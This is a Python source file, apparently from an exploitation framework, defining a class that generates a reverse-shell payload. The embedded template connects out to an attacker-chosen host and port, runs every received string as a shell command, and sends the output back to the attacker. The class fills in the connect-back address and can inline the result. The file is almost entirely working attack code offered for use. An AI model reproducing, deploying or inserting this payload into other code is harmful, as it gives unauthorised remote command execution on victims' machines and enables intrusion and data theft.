from shellcode import Shellcode
class PythonShellcodes(Shellcode):
    """
        Class with shellcodes for python language
    """

    def __init__(self, connectback_ip='localhost', connectback_port=5555):
        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port)
        self.name = ""
        return

    def get_python_code(self, badchars, localhost, localport):
        """
            Function to get python shellcode
        """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        pythoncode = ""
        pythoncode += """
#!/usr/bin/python
import socket,subprocess

HOST = 'LOCALHOST'    # The remote host
PORT = LOCALPORT      # The same port as used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to attacker machine
s.connect((HOST, PORT))

# send we are connected
s.send('[*] Connection Established!')
# start loop
while 1:
    # recieve shell command
    data = s.recv(1024)
    print data

    # if its quit, then break out and close socket
    if data == 'quit' or data == 'q':
        break

    # do shell command
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    # read output
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # send output to attacker
    s.send(stdout_value)
# close socket
s.close()
"""

        pythoncode = pythoncode.replace("LOCALHOST", str(localhost))
        pythoncode = pythoncode.replace("LOCALPORT", str(localport))

        return pythoncode

    def get_shellcode(self, inline=False):
        shell = self.get_python_code(self.BADCHARS, self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        if inline:
            shell = self.make_inline(shell)
        return shell